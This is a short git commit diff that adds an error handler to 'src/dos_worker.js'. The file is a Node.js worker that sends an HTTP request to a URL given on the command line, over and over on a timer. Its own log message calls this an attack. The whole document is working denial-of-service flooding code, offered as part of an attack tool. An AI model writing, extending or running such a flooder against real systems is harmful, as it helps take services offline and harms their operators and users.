4deaaec2b76225769a6f4eecd8603271ed51481b
Vlad <weststalkers@gmail.com>
2017-09-03 19:11:58 +0300

    Add error handler.

--- src/dos_worker.js
+++ src/dos_worker.js
@@ -1,7 +1,12 @@
 const request = require('request')
 
 setInterval(() => {
-    request(process.argv[2])
+    request(process.argv[2], (error) => {
+        if (!!error) {
+            console.log('The attack ended with an error.')
+            process.abort()
+        }
+    })
 }, process.argv[4])
 
 setTimeout(() => {
